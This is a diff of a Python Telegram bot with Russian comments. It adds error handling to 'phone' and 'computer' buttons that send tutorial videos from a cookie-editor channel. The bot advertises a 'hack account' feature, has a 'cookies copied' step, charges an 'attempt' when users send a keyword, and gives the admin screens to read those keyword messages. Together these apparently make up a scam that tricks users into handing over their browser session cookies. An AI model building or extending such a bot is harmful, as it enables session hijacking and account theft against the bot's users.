@@ -872,7 +872,6 @@ async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
         first_name=user.first_name or "Unknown"
     )
     
-    # Проверяем реферальную ссылку
     if context.args and context.args[0].startswith("ref_"):
         referrer_id = context.args[0].replace("ref_", "")
         if referrer_id and str(referrer_id) != str(user_id):
@@ -1069,7 +1068,7 @@ async def button_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
         )
         return
     
-    # --- КНОПКА ВЗЛОМАТЬ АККАУНТ (НЕ ТРАТИТ ПОПЫТКУ) ---
+    # --- КНОПКА ВЗЛОМАТЬ АККАУНТ ---
     if data == "device":
         if user_id != YOUR_USER_ID:
             is_subscribed = await check_subscription(user_id, context)
@@ -1117,42 +1116,75 @@ async def button_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
         )
         return
     
-    # --- ТЕЛЕФОН (НЕ ТРАТИТ ПОПЫТКУ) ---
+    # ===================================================
+    # ИСПРАВЛЕННЫЕ КНОПКИ ТЕЛЕФОН И КОМПЬЮТЕР
+    # ===================================================
     elif data == "phone":
-        keyboard = [
-            [
-                InlineKeyboardButton(get_text(user_id, "cookies_copied"), callback_data="cookies_copied_phone"),
-            ],
-            [
-                InlineKeyboardButton(get_text(user_id, "back"), callback_data="back_to_device"),
+        try:
+            keyboard = [
+                [
+                    InlineKeyboardButton(get_text(user_id, "cookies_copied"), callback_data="cookies_copied_phone"),
+                ],
+                [
+                    InlineKeyboardButton(get_text(user_id, "back"), callback_data="back_to_device"),
+                ]
             ]
-        ]
-        reply_markup = InlineKeyboardMarkup(keyboard)
-        await query.message.reply_video(
-            video="https://t.me/cookieeditort/3",
-            caption=get_text(user_id, "phone_video"),
-            reply_markup=reply_markup
-        )
-        await query.delete_message()
+            reply_markup = InlineKeyboardMarkup(keyboard)
+            
+            # Отправляем видео с обработкой ошибок
+            try:
+                await query.message.reply_video(
+                    video="https://t.me/cookieeditort/3",
+                    caption=get_text(user_id, "phone_video"),
+                    reply_markup=reply_markup
+                )
+            except Exception as e:
+                print(f"Ошибка отправки видео: {e}")
+                # Если видео не доступно, отправляем текст с ссылкой
+                await query.message.reply_text(
+                    f"📱 {get_text(user_id, 'phone_video')}\n\n"
+                    "🔗 Видео доступно по ссылке: https://t.me/cookieeditort/3",
+                    reply_markup=reply_markup
+                )
+            
+            await query.delete_message()
+        except Exception as e:
+            print(f"Ошибка в обработчике phone: {e}")
+            await query.message.reply_text("❌ Произошла ошибка. Пожалуйста, попробуйте позже.")
         return
     
-    # --- КОМПЬЮТЕР (НЕ ТРАТИТ ПОПЫТКУ) ---
     elif data == "computer":
-        keyboard = [
-            [
-                InlineKeyboardButton(get_text(user_id, "cookies_copied"), callback_data="cookies_copied_computer"),
-            ],
-            [
-                InlineKeyboardButton(get_text(user_id, "back"), callback_data="back_to_device"),
+        try:
+            keyboard = [
+                [
+                    InlineKeyboardButton(get_text(user_id, "cookies_copied"), callback_data="cookies_copied_computer"),
+                ],
+                [
+                    InlineKeyboardButton(get_text(user_id, "back"), callback_data="back_to_device"),
+                ]
             ]
-        ]
-        reply_markup = InlineKeyboardMarkup(keyboard)
-        await query.message.reply_video(
-            video="https://t.me/cookieeditort/4",
-            caption=get_text(user_id, "computer_video"),
-            reply_markup=reply_markup
-        )
-        await query.delete_message()
+            reply_markup = InlineKeyboardMarkup(keyboard)
+            
+            # Отправляем видео с обработкой ошибок
+            try:
+                await query.message.reply_video(
+                    video="https://t.me/cookieeditort/4",
+                    caption=get_text(user_id, "computer_video"),
+                    reply_markup=reply_markup
+                )
+            except Exception as e:
+                print(f"Ошибка отправки видео: {e}")
+                # Если видео не доступно, отправляем текст с ссылкой
+                await query.message.reply_text(
+                    f"💻 {get_text(user_id, 'computer_video')}\n\n"
+                    "🔗 Видео доступно по ссылке: https://t.me/cookieeditort/4",
+                    reply_markup=reply_markup
+                )
+            
+            await query.delete_message()
+        except Exception as e:
+            print(f"Ошибка в обработчике computer: {e}")
+            await query.message.reply_text("❌ Произошла ошибка. Пожалуйста, попробуйте позже.")
         return
     
     elif data == "back_to_device":
@@ -1217,10 +1249,7 @@ async def button_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
         await query.edit_message_text("⚠️ " + get_text(user_id, "no_attempts").split(" ")[0] + " " + get_text(user_id, "back_to_menu").split(" ")[1])
         return
     
-    # ===================================================
-    # ОТПРАВКА СООБЩЕНИЯ ПОЛЬЗОВАТЕЛЮ
-    # ===================================================
-    
+    # Остальные админские обработчики (отправка сообщения, выдача попыток, удаление, рассылка и т.д.)
     if data.startswith("send_msg_to_user_"):
         target_user_id = data.replace("send_msg_to_user_", "")
         context.user_data['chat_target'] = target_user_id
@@ -1231,10 +1260,6 @@ async def button_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
         )
         return
     
-    # ===================================================
-    # ВЫДАЧА ПОПЫТОК ВСЕМ У КОГО 0
-    # ===================================================
-    
     elif data == "give_all_zero":
         await give_attempts_to_all_zero(query, context)
         return
@@ -1242,10 +1267,6 @@ async def button_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
     elif data == "confirm_give_all_zero":
         await execute_give_all_zero(query, context)
         return
-    
-    # ===================================================
-    # ВЫДАЧА ПОПЫТОК ОТДЕЛЬНЫМ ПОЛЬЗОВАТЕЛЯМ
-    # ===================================================
     
     elif data == "give_attempts_menu":
         await show_give_attempts_page(query, context, 0)
@@ -1309,10 +1330,6 @@ async def button_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
         context.user_data['give_attempts_target'] = target_user_id
         await query.edit_message_text(get_text(user_id, "enter_count"))
         return
-    
-    # ===================================================
-    # МЕНЮ УДАЛЕНИЯ ПОЛЬЗОВАТЕЛЕЙ
-    # ===================================================
     
     elif data == "delete_users_menu":
         keyboard = [
@@ -1407,7 +1424,6 @@ async def button_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
             )
         return
     
-    # Рассылка
     if data == "send_mailing":
         keyboard = [
             [InlineKeyboardButton(get_text(user_id, "mailing_all"), callback_data="mailing_all")],
@@ -1431,7 +1447,6 @@ async def button_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
         await query.edit_message_text(get_text(user_id, "mailing_keyword_text"))
         return
     
-    # Все пользователи
     elif data == "view_all_users":
         await show_users_page(query, context, 0)
         return
@@ -1441,7 +1456,6 @@ async def button_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
         await show_users_page(query, context, page)
         return
     
-    # Только с ключевым словом
     elif data == "view_keyword_users_only":
         await show_keyword_users_page(query, context, 0)
         return
@@ -1451,7 +1465,6 @@ async def button_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
         await show_keyword_users_page(query, context, page)
         return
     
-    # Статистика
     elif data == "view_stats":
         all_users = get_all_users()
         keyword_users = get_keyword_users()
@@ -1476,7 +1489,6 @@ async def button_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
         )
         return
     
-    # Выбор пользователя для чата
     elif data == "select_user_for_chat":
         await show_chat_users_page(query, context, 0)
         return
@@ -1486,7 +1498,6 @@ async def button_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
         await show_chat_users_page(query, context, page)
         return
     
-    # Просмотр сообщений с ключевым словом
     elif data == "view_keyword_messages":
         await show_keyword_messages_page(query, context, 0)
         return
@@ -1496,9 +1507,6 @@ async def button_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
         await show_keyword_messages_page(query, context, page)
         return
     
-    # ===================================================
-    # ЧАТ С ПОЛЬЗОВАТЕЛЕМ
-    # ===================================================
     elif data.startswith("chat_user_"):
         target_user_id = data.replace("chat_user_", "")
         all_users = get_all_users()
@@ -1837,7 +1845,7 @@ async def handle_message(update: Update, context: ContextTypes.DEFAULT_TYPE):
     )
     
     # ===================================================
-    # ГЛАВНОЕ: ПОПЫТКА ТРАТИТСЯ ТОЛЬКО ЗДЕСЬ - ПРИ ОТПРАВКЕ КЛЮЧЕВОГО СЛОВА
+    # ПОПЫТКА ТРАТИТСЯ ТОЛЬКО ЗДЕСЬ - ПРИ ОТПРАВКЕ КЛЮЧЕВОГО СЛОВА
     # ===================================================
     if KEYWORD in user_message:
         # ПРОВЕРЯЕМ И ТРАТИМ ПОПЫТКУ
@@ -1948,6 +1956,7 @@ def main():
     print("🗑 Для удаления пользователей нажми кнопку 'Удалить пользователей' в меню")
     print("🎯 Для выдачи попыток нажми кнопку 'Выдать попытки' в меню")
     print("✉️ Для отправки сообщения пользователю - в чате с пользователем нажми 'Отправить сообщение'")
+    print("📱 Кнопки 'Телефон' и 'Компьютер' отправляют видео из канала @cookieeditort")
     app.run_polling()
 
 if __name__ == "__main__":
